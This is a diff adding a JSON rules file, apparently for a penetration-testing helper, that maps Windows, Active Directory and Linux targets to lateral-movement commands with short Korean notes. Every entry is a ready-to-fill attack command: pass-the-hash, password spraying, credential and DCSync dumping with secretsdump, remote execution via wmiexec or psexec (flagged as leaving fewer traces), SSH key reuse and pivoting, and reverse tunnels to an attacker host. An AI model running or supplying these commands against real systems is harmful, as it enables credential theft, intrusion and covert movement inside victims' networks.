@@ -1,0 +1,69 @@
+[
+  {
+    "name": "Pass-the-Hash 재사용",
+    "when": {"os": ["windows", "windows_ad"], "ports": [445, 5985]},
+    "suggest": [
+      "netexec smb {t} -u {user} -H {hash} --local-auth",
+      "netexec smb {t} -u {user} -H {hash}",
+      "evil-winrm -i {t} -u {user} -H {hash}"
+    ],
+    "note": "NTLM 해시로 인증. 로컬 관리자 해시 재사용(패스워드 재사용)으로 측면이동. 수동.",
+    "tags": ["lateral", "pth", "ad"],
+    "phase": "lateral"
+  },
+  {
+    "name": "자격증명 전수 재사용(스프레이)",
+    "when": {"os": ["windows", "windows_ad"], "ports": [445]},
+    "suggest": [
+      "netexec smb {t} -u users.txt -p {pass} --continue-on-success",
+      "netexec smb {t} -u {user} -p passwords.txt --continue-on-success"
+    ],
+    "note": "확보한 암호/해시를 전체 사용자·호스트에 재사용. 계정잠금 정책 주의.",
+    "tags": ["lateral", "spray", "ad"],
+    "phase": "lateral"
+  },
+  {
+    "name": "자격증명 덤프(secretsdump)",
+    "when": {"os": ["windows", "windows_ad"], "ports": [445]},
+    "suggest": [
+      "impacket-secretsdump {domain}/{user}:{pass}@{t}",
+      "netexec smb {t} -u {user} -p {pass} --sam --lsa"
+    ],
+    "note": "SAM/LSA/DCSync 로 해시 수집 → 추가 PtH. 관리자 권한 필요.",
+    "tags": ["lateral", "creds", "dcsync"],
+    "phase": "lateral"
+  },
+  {
+    "name": "원격 명령 실행(psexec/wmiexec)",
+    "when": {"os": ["windows", "windows_ad"], "ports": [445]},
+    "suggest": [
+      "impacket-wmiexec {domain}/{user}:{pass}@{t}",
+      "impacket-psexec {domain}/{user}:{pass}@{t}"
+    ],
+    "note": "wmiexec 는 흔적 적음(권장), psexec 는 서비스 생성. 자격증명 필요.",
+    "tags": ["lateral", "exec", "ad"],
+    "phase": "lateral"
+  },
+  {
+    "name": "SSH 피벗/키 재사용",
+    "when": {"os": ["linux"], "ports": [22]},
+    "suggest": [
+      "ssh -i id_rsa {user}@{t}",
+      "ssh -L 0.0.0.0:LPORT:127.0.0.1:RPORT {user}@{t}"
+    ],
+    "note": "수집한 개인키/암호 재사용. 로컬포트포워딩으로 내부 서비스 노출. 수동.",
+    "tags": ["lateral", "ssh", "pivot"],
+    "phase": "lateral"
+  },
+  {
+    "name": "터널링/피벗(chisel/ligolo)",
+    "when": {"os": ["linux", "windows", "windows_ad"]},
+    "suggest": [
+      "chisel client {attacker}:LPORT R:socks",
+      "ligolo-ng agent -connect {attacker}:LPORT"
+    ],
+    "note": "내부 대역 도달용 피벗. 발견한 내부 호스트로 재스캔. {attacker} 수동.",
+    "tags": ["lateral", "pivot", "tunnel"],
+    "phase": "lateral"
+  }
+]
